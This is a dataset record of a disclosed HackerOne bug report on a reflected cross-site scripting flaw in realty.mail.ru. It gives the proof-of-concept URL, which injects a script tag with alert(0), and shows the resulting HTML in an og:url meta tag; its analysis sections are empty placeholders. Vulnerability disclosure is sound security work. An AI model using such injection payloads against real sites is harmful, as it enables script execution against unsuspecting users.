---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '51060'
original_report_id: '51060'
title: XSS in realty.mail.ru
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2015-03-11T23:04:30.848Z'
disclosed_at: '2015-05-02T17:33:59.085Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS in realty.mail.ru

## Metadata

- HackerOne Report ID: 51060
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2015-05-02T17:33:59.085Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

The XSS vulnerability is located here:

```
https://realty.mail.ru/remont/article/9618.html/tttt%22%3E%3Cscript%3Ealert%280%29%3C/script%3E
```

It is caused by the full URL being loaded like so: 

```html
<meta property="og:url" content="https://realty.mail.ru/remont/article/9618.html/tttt">
<script>
    alert(0)
</script>">
```

I am aware that this is out of scope, but I am still reporting it since I just happened to spot it while looking for other bugs.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
